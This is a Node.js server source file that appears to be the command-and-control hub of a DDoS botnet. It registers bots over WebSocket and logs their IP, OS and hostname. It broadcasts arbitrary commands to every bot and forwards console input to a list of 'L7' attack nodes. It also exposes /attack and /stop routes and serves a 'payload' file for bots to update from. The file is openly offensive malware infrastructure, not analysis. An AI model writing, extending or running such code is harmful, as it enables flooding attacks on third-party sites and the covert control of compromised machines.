const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');
const os = require('os');
const cookieParser = require('cookie-parser');
const { initUserbot } = require('./userbot/bot');

const {
    logger,
    printBanner,
    printBotConnected,
    printBotDisconnected,
    printBroadcast,
    printAttackStart,
    printAttackStop,
    printExternalAPI,
    printNodeRegistered,
    printConsoleReady,
    printUncaughtException,
    printUnhandledRejection,
    gradient, A, P, rgb,
    timestamp, uptime, memUsage,
    statusDot,
} = require('./console');

// ─────────────────────────────────────────────────────────────────────────────
//  Global error handlers
// ─────────────────────────────────────────────────────────────────────────────
process.on('uncaughtException', (err) => printUncaughtException(err));
process.on('unhandledRejection', (err) => printUnhandledRejection(err));

// ─────────────────────────────────────────────────────────────────────────────
//  Express setup
// ─────────────────────────────────────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3029;

app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Update file route
app.get('/update/tls', (req, res) => {
    const file = path.join(__dirname, 'payload-express', 'tls.js');
    if (fs.existsSync(file)) return res.sendFile(file);
    res.status(404).send('File tls.js tidak ada!');
});

// ─────────────────────────────────────────────────────────────────────────────
//  Config helpers
// ─────────────────────────────────────────────────────────────────────────────
const CONFIG_DIR = path.join(__dirname, 'config');
if (!fs.existsSync(CONFIG_DIR)) fs.mkdirSync(CONFIG_DIR, { recursive: true });

function cfgPath(file) { return path.join(CONFIG_DIR, file); }

function loadJson(filePath, fallback = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const raw = fs.readFileSync(filePath, 'utf8').trim();
            return raw ? JSON.parse(raw) : fallback;
        }
    } catch (_) { }
    return fallback;
}

function loadServers(filePath) {
    const data = loadJson(filePath, []);
    return Array.isArray(data) ? data : [];
}

function loadMethods(filePath) {
    const data = loadJson(filePath, {});
    const flattened = {};
    for (const key in data) {
        if (typeof data[key] === 'object' && !data[key].command) {
            for (const method in data[key]) {
                flattened[method.toLowerCase()] = { ...data[key][method], category: 'l7' };
            }
        } else {
            flattened[key.toLowerCase()] = data[key];
        }
    }
    return flattened;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Axios client
// ─────────────────────────────────────────────────────────────────────────────
const axiosClient = axios.create({
    httpAgent: new http.Agent({ keepAlive: false, maxSockets: Infinity, maxFreeSockets: 0, timeout: 15000 }),
    httpsAgent: new https.Agent({ keepAlive: false, maxSockets: Infinity, maxFreeSockets: 0, timeout: 15000 }),
    timeout: 10000,
    responseType: 'stream',
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
});

// ─────────────────────────────────────────────────────────────────────────────
//  Paths & defaults
// ─────────────────────────────────────────────────────────────────────────────
const paths = {
    config: cfgPath('config.json'),
    methods: cfgPath('methods.json'),
    serversL7: cfgPath('l7.json'),
    cooldown: cfgPath('cooldown.json'),
    external: cfgPath('external.json'),
};

const defaults = { config: {}, methods: {}, serversL7: [], cooldown: {}, external: [] };
Object.entries(paths).forEach(([key, p]) => {
    if (!fs.existsSync(p)) fs.writeFileSync(p, JSON.stringify(defaults[key], null, 2));
});

// ─────────────────────────────────────────────────────────────────────────────
//  State
// ─────────────────────────────────────────────────────────────────────────────
const state = {
    config: loadJson(paths.config),
    methods: loadMethods(paths.methods),
    serversL7: loadServers(paths.serversL7),
    cooldownData: loadJson(paths.cooldown),
    external: loadJson(paths.external, []),
    activeAttacks: {},
    activeTargets: {},
    globalActiveTargets: new Set(),
    attackLog: [],
    runningAttacks: {},

    // Network
    bots: new Map(),  // botId → { ws, info, connectedAt, lastSeen, ... }
    botHistory: [],         // disconnected history (last 500)
};

fs.watchFile(paths.config, () => { state.config = loadJson(paths.config); });
fs.watchFile(paths.methods, () => { state.methods = loadMethods(paths.methods); });
fs.watchFile(paths.external, () => { state.external = loadJson(paths.external, []); });
fs.watchFile(paths.serversL7, (c, p) => { if (c.mtime !== p.mtime) state.serversL7 = loadServers(paths.serversL7); });

app.locals.state = state;
app.locals.axiosClient = axiosClient;
app.locals.cooldownPath = paths.cooldown;

// ─────────────────────────────────────────────────────────────────────────────
//  HTTP server
// ─────────────────────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ─────────────────────────────────────────────────────────────────────────────
//  WebSocket — Bot C2
// ─────────────────────────────────────────────────────────────────────────────
const wss = new WebSocketServer({ server, path: '/connect' });

function genBotId() {
    return `bot_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 7)}`;
}

wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket?.remoteAddress
        || 'unknown';
    const botId = genBotId();

    const botEntry = {
        ws,
        id: botId,
        ip,
        info: {},
        connectedAt: Date.now(),
        lastSeen: Date.now(),
        status: 'online',
    };

    state.bots.set(botId, botEntry);

    // Initial connection status
    logger.info(`Bot handshaking...`, { id: botId, ip });

    // Send bot its ID
    ws.send(JSON.stringify({ type: 'handshake', botId }));

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            botEntry.lastSeen = Date.now();

            switch (msg.type) {
                case 'info':
                    // Bot sends system info — merge and reprint with details
                    botEntry.info = { ...botEntry.info, ...msg.data };
                    // Reprint the bot box now that we have full info
                    printBotConnected(botEntry, state.bots.size);
                    break;

                case 'heartbeat':
                    ws.send(JSON.stringify({ type: 'pong' }));
                    // Light heartbeat log (debug level, non-intrusive)
                    logger.debug(`Heartbeat`, { id: botId, ip });
                    break;

                case 'result':
                    // Command result from bot
                    logger.c2(`Result from ${botId}`, {
                        ok: msg.data?.success ? 'yes' : 'no',
                        ...(msg.data?.output ? { out: String(msg.data.output).slice(0, 80) } : {}),
                    });
                    break;

                case 'error':
                    logger.error(`Bot error — ${botId}`, { msg: String(msg.data?.message || '').slice(0, 80) });
                    break;

                default:
                    logger.debug(`Unknown message type "${msg.type}" from ${botId}`);
                    break;
            }
        } catch (_) { }
    });

    ws.on('close', () => {
        botEntry.status = 'offline';
        botEntry.disconnectedAt = Date.now();

        state.botHistory.unshift({ ...botEntry, ws: undefined });
        if (state.botHistory.length > 500) state.botHistory.pop();
        state.bots.delete(botId);

        printBotDisconnected(botEntry, state.bots.size, 'close');
    });

    ws.on('error', (err) => {
        logger.warn(`WebSocket error — ${botId}`, { err: err.message });
    });
});

// ── Bot timeout cleanup ───────────────────────────────────────────────────────
setInterval(() => {
    const now = Date.now();
    const timeout = 60_000;

    for (const [botId, bot] of state.bots) {
        if (now - bot.lastSeen > timeout) {
            bot.status = 'offline';
            bot.disconnectedAt = now;

            state.botHistory.unshift({ ...bot, ws: undefined });
            if (state.botHistory.length > 500) state.botHistory.pop();
            state.bots.delete(botId);

            printBotDisconnected(bot, state.bots.size, 'timeout');

            try { bot.ws?.terminate(); } catch (_) { }
        }
    }
}, 30_000);

// ── Broadcast helper ──────────────────────────────────────────────────────────
global.broadcastBots = function (payload) {
    const msg = JSON.stringify(payload);
    let sent = 0;

    state.bots.forEach((bot, botId) => {
        try {
            if (bot.ws && bot.ws.readyState === WebSocket.OPEN) {
                bot.ws.send(msg, (err) => {
                    if (err) {
                        logger.warn(`Send failed — ${botId}`, { err: err.message });
                        bot.ws.terminate();
                    }
                });
                sent++;
            } else {
                state.bots.delete(botId);
            }
        } catch (e) {
            logger.error(`Broadcast error — ${botId}`, { err: e.message });
            state.bots.delete(botId);
        }
    });

    printBroadcast({
        command: typeof payload.command === 'string' ? payload.command : JSON.stringify(payload),
        sentTo: sent,
        total: state.bots.size,
    });

    return sent;
};

// ─────────────────────────────────────────────────────────────────────────────
//  Routes
// ─────────────────────────────────────────────────────────────────────────────
app.use('/attack', require('./plugins/attack'));
app.use('/stop', require('./plugins/stop'));
app.use('/status', require('./plugins/status'));
app.use('/history', require('./plugins/history'));
app.use('/info', require('./plugins/info'));
app.use('/bots', require('./plugins/bots'));
app.use('/uptime', require('./plugins/uptime'));

// Node self-registration
app.post('/api/nodes/register', (req, res) => {
    const { name, host, type } = req.body;
    if (!name || !host)
        return res.status(400).json({ status: 'error', message: 'missing name or host' });

    const category = (type || 'l7').toLowerCase();

    try {
        const servers = loadServers(paths.serversL7);
        if (servers.find(s => s.host === host))
            return res.json({ status: 'success', message: 'node already registered' });

        servers.push({ name, host });
        fs.writeFileSync(paths.serversL7, JSON.stringify(servers, null, 2));

        printNodeRegistered({ name, host, category });
        res.json({ status: 'success', message: 'node registered successfully' });
    } catch (err) {
        logger.error(`Node registration failed`, { err: err.message });
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.get('/', (req, res) => {
    const active = Object.values(state.activeAttacks).reduce((s, c) => s + c, 0);
    res.json({
        status: 'online',
        nodes: state.serversL7.length,
        methods: Object.keys(state.methods).length,
        active,
        network: { online: state.bots.size, total: state.bots.size + state.botHistory.length },
        endpoints: {
            attack: '/attack',
            stop: '/stop',
            status: '/status',
            history: '/history',
            info: '/info',
            bots: '/bots',
            connect: '/connect (ws)',
        },
    });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Expose printAttackStart/Stop for plugin use
// ─────────────────────────────────────────────────────────────────────────────
app.locals.printAttackStart = printAttackStart;
app.locals.printAttackStop = printAttackStop;

function consolePrompt() {
    const botsOnline = state.bots.size > 0;
    const marker = statusDot(botsOnline);
    const left = `${gradient('MEJI', P.primary)} ${A.dim}${rgb(70, 82, 116)}console${A.reset}`;
    const activeSlots = Object.values(state.activeAttacks).reduce((sum, count) => sum + Number(count || 0), 0);
    const stats = [
        `bots:${state.bots.size}`,
        `nodes:${state.serversL7.length}`,
        `active:${activeSlots}`,
    ].map(v => `${A.dim}${rgb(118, 132, 166)}${v}${A.reset}`).join(` ${A.dim}${rgb(54, 64, 92)}|${A.reset} `);

    return `\n  ${A.dim}${rgb(54, 64, 92)}┌─${A.reset} ${marker} ${left} ${A.dim}${rgb(54, 64, 92)}[${A.reset}${stats}${A.dim}${rgb(54, 64, 92)}]${A.reset}\n  ${A.dim}${rgb(54, 64, 92)}└─${rgb(90, 108, 158)}›${A.reset} `;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Start
// ─────────────────────────────────────────────────────────────────────────────
server.listen(PORT, () => {
    // Draw the full banner
    printBanner({
        port: PORT,
        nodes: state.serversL7.length,
        methods: Object.keys(state.methods).length,
        bots: 0,
    });

    // External APIs
    if (Array.isArray(state.external)) {
        state.external.filter(a => a.enabled).forEach(printExternalAPI);
    }

    // Init userbot + interactive console
    (async () => {
        try {
            await initUserbot();

            // ── Unified readline console ─────────────────────────────────────
            const rl = require('readline').createInterface({
                input: process.stdin,
                output: process.stdout,
                prompt: consolePrompt(),
            });

            const refreshPrompt = () => {
                rl.setPrompt(consolePrompt());
                rl.prompt(true);
            };

            // Patch console.log so readline prompt is preserved
            const origLog = console.log;
            console.log = (...args) => {
                if (rl.line !== undefined) {
                    process.stdout.write(A.clearLine);
                    origLog(...args);
                    refreshPrompt();
                } else {
                    origLog(...args);
                }
            };

            printConsoleReady();
            refreshPrompt();

            rl.on('line', async (line) => {
                const input = line.trim();
                if (!input) return refreshPrompt();
                if (input.toLowerCase() === 'exit') {
                    logger.warn('Console exit requested, shutting down');
                    process.exit(0);
                }

                // Special: 'bots' — list connected bots
                if (input.toLowerCase() === 'bots') {
                    logger.section('CONNECTED BOTS');
                    if (state.bots.size === 0) {
                        logger.warn('No bots currently connected');
                    } else {
                        let i = 1;
                        state.bots.forEach((bot) => {
                            logger.bot(
                                `${i++}. ${bot.id}`,
                                {
                                    ip: bot.ip,
                                    session: uptime(Date.now() - bot.connectedAt),
                                    os: bot.info?.os || '—',
                                    host: bot.info?.hostname || '—',
                                }
                            );
                        });
                    }
                    logger.nl();
                    return refreshPrompt();
                }

                // Special: 'status' — quick summary
                if (input.toLowerCase() === 'status') {
                    logger.section('C2 STATUS');
                    logger.info('Server', { port: PORT, pid: process.pid, mem: memUsage() });
                    logger.info('Network', { bots: state.bots.size, nodes: state.serversL7.length });
                    logger.info('Attacks', { active: Object.keys(state.activeAttacks).length, methods: Object.keys(state.methods).length });
                    logger.nl();
                    return refreshPrompt();
                }

                // Broadcast to L7 nodes
                const servers = state.serversL7;
                if (servers.length === 0) {
                    logger.warn('No L7 nodes available, command not sent');
                } else {
                    logger.section('CONSOLE DISPATCH', P.info);
                    logger.c2(`Broadcasting to ${servers.length} node(s)`, { cmd: input.slice(0, 60) });
                    const results = await Promise.allSettled(
                        servers.map(srv =>
                            axiosClient
                                .post(srv.host + '/', { command: input })
                                .then(() => ({ name: srv.name, ok: true }))
                                .catch(e => {
                                    logger.error(`Node fail`, { name: srv.name, err: e.message });
                                    return { name: srv.name, ok: false };
                                })
                        )
                    );
                    const ok = results.filter(r => r.value?.ok).length;
                    logger.ok('Dispatch complete', { success: ok, failed: servers.length - ok, total: servers.length });
                    logger.nl();
                }

                refreshPrompt();
            });

        } catch (err) {
            logger.error(`Critical startup error`, { err: err.message });
        }
    })();
});
